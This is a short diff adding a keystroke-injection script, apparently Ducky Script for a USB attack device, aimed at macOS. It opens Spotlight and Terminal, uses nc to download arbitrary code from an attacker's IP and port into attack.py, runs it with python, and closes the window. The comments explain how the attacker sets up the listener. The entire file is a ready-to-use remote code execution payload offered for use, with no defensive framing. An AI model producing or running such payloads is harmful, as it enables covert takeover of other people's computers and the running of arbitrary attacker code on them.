@@ -1,0 +1,28 @@
+REM Using reverse shell to run code from 
+REM On attacker device, you'll need to open terminal, type 'nc -l [PORT]' and type whatever code you want to run there
+
+REM Demonstration: https://www.youtube.com/watch?v=0tMQlwqpgIE
+
+REM Open spotlight search
+DELAY   1000
+GUI     SPACE
+DELAY   1000
+
+REM Open terminal from spotlight search
+STRING  terminal
+ENTER
+DELAY   500
+
+REM Start reverse shell with ATTACKER'S IP ADDRESS and PORT and output
+REM the stuff from the ATTACKER'S terminal into a python file (doesn't need to necessarily be python)
+STRING  nc [IP-ADDRESS] [PORT] > attack.py
+ENTER
+DELAY   20000
+
+REM Compile and run whatever is on that file using python
+STRING  python attack.py
+ENTER
+DELAY   10000
+
+REM Quit terminal
+GUI     q
